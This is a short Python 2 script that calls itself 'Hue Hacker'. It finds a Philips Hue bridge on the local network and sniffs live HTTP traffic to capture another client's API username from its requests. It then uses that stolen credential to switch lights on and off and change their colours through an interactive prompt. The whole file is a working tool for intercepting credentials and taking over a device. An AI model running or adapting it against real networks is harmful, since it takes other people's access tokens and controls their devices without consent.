import requests
import json
import pyshark
import itertools, sys

hue_ip_addr = hue_id = ''
user_ids = []

def find_hue():
   global hue_ip_addr, hue_id
   hue_info_request = requests.get('https://www.meethue.com/api/nupnp')

   hue_info = json.loads(hue_info_request.text)

   if len(hue_info) > 0:
      hue_info = hue_info[0]
      if 'internalipaddress' in hue_info:
         print 'Hue found'
         hue_ip_addr = hue_info['internalipaddress']
         print 'Hue ip address:', hue_ip_addr
      else:
         print 'Could not find Hue ip address'
      if 'id' in hue_info:
         hue_id = hue_info['id']
         print 'Hue id:', hue_id
      else:
         print 'Could not find Hue id'
   else:
      print 'Bad response'

def set_light(on):
   global hue_ip_addr, user_ids
   if hue_ip_addr == '':
      print 'No Hue ip address'
      return
   if not len(user_ids) < 1:
      requests.put('http://' + hue_ip_addr + '/api/' + user_ids[0] + '/groups/1/action', data=json.dumps({'on': on}))

def set_color(x, y, bright):
   global hue_ip_addr, user_ids
   if hue_ip_addr == '':
      print 'No Hue ip address'
      return
   if not len(user_ids) < 1:
      requests.put('http://' + hue_ip_addr + '/api/' + user_ids[0] + '/groups/1/action', data='{"xy":' + str([x,y]) + '}')

def find_username():
   capture_filter = 'tcp and dst port 80 and host ' + hue_ip_addr

   try:
      capture = pyshark.LiveCapture(interface='en0', only_summaries=True, bpf_filter=capture_filter)
   except pyshark.capture.capture.TSharkCrashException:
      capture = pyshark.LiveCapture(interface='wlan0', only_summaries=True, bpf_filter=capture_filter)

   for packet in capture.sniff_continuously():
      info = packet.info.split(' ')
      if len(info) >= 2:
         if info[0] == 'GET' or info[0] == 'PUT':
            header = info[1].split('/')
            if len(header) >= 1:
               del header[0]
            if len(header) >= 2 and header[0] == 'api' and header[1] != 'nouser':
               if not header[1] in user_ids:
                  user_ids.append(header[1])
                  print 'Found username:', header[1]
                  return

def valid_rgb(val):
   return val <= 255 and val >= 0

def rgb_to_xy(red, green, blue):
   red = pow((red + 0.055) / (1.0 + 0.055), 2.4) if (red > 0.04045) else (red / 12.92)
   green = pow((green + 0.055) / (1.0 + 0.055), 2.4) if (green > 0.04045) else (green / 12.92)
   blue =  pow((blue + 0.055) / (1.0 + 0.055), 2.4)if (blue > 0.04045) else (blue / 12.92)

   x = red * 0.664511 + green * 0.154324 + blue * 0.162028
   y = red * 0.283881 + green * 0.668433 + blue * 0.047685
   z = red * 0.000088 + green * 0.072310 + blue * 0.986039

   x_final = x / (x + y + z)
   y_final = y / (x + y + z)

   return (x_final, y_final)

if __name__ == "__main__":
   print 'Welcome to Hue Hacker'
   print 'Searching for hue...'
   find_hue()
   print 'Finding username...'
   spinner = itertools.cycle(['-', '/', '|', '\\'])
   find_username()

   cmd = ''
   while True:
      cmd = raw_input('Command: ')
      if cmd == 'quit' or cmd == 'Quit':
         break
      elif cmd == 'on' or cmd == 'On':
         set_light(True)
      elif cmd == 'off' or cmd == 'Off':
         set_light(False)
      elif cmd == 'color' or cmd == 'Color':
         color = raw_input('Input color <red, green, blue> ')
         rgb = color.split(', ')
         if len(rgb) == 3:
            red = int(rgb[0])
            green = int(rgb[1])
            blue = int(rgb[2])
            if (valid_rgb(red) and valid_rgb(green) and valid_rgb(blue)):
               xy = rgb_to_xy(red, green, blue)
               set_color(xy[0], xy[1], xy[1])
            else:
               print 'Invalid rgb'
         else:
            print 'Invalid rgb'

